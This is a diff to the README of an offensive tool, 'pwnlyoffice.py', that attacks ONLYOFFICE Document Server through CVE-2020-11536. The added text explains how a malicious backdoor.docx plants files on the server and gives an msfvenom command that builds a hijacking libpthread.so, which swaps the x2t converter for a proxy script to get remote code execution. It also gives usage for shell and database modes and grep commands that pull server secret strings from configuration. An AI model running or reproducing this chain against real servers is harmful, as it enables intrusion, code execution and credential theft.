@@ -34,21 +34,49 @@ Any hits to `/uniquepath` means that the server meets the conditions for being a
 
 This generates `backdoor.docx`. Host this on a web server which is visible to the document server.
 
+When loaded in ONLYOFFICE, this will write a number of files into `/var/www/onlyoffice/documentserver/server/FileConverter/bin` using CVE-2020-11536.
+
+ - `proxy.sh` - written to `x2t.sh` and will proxy through any commands for x2t in order to provide arbitrary RCE
+ - `hijack.so` - generated using `msfvenom -a x64 -p linux/x64/exec CMD="cp bin/x2t bin/x2t.new; mv bin/x2t.sh bin/x2t; chmod u+x bin/x2t" -f elf-so -o hijack.so`. This is written to the server as `libpthread.so` in order to be loaded higher up the `ld` search and execute a command which switches out the legit `x2t` binary for a script which proxies it.
+ - `x2t` - this is the legit `x2t`, written to `x2t.old` because in case anything goes wrong, that file will be there to restore `x2t`
+
+To restore a borked server back to pre-pwned state in case anything went wrong with this, `libpthread.so` should not be in `FileConverter/bin` - delete that. `x2t` should be the legit `x2t` iELF binary and not a bash script. There shouldn't be any `.sh` files in that folder.
+
 ### Prompt Document Server to Download Malicious document
 
 ```bash
 ./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://yoursite/backdoor.docx dl
 ```
 
-This will write a number of files into `/var/www/onlyoffice/documentserver/server/FileConverter/bin` using CVE-2020-11536. Depending on the commit status of this project, which files that is and what they do may vary, but this should illustrate the point.
 
 ### Run Shell Commands on Server
 
+
 ```bash
-./pwnlyoffice.py -u https://theonlyofficesiteurl -D https://anyvalidurl shell
+./pwnlyoffice.py -u https://theonlyofficesiteurl shell
 ```
 
-This feature isn't currently working, but will be in future.
+#### Useful commands
+
+Get the document cache folder location:
+
+```bash
+grep -A 2 storage /etc/onlyoffice/documentserver/*linux.json | grep folderPath
+```
+
+Get server secret strings (do we need them at this point?)
+
+```bash
+grep -i secret /etc/onlyoffice/documentserver/*
+```
+
+### Query the document server DB
+
+```bash
+./pwnlyoffice.py -u https://theonlyofficesiteurl sql
+```
+
+Get a list of valid document ids with `SELECT DISTINCT id FROM task_result`
 
 ### Get AWS Temporary Credentials
 
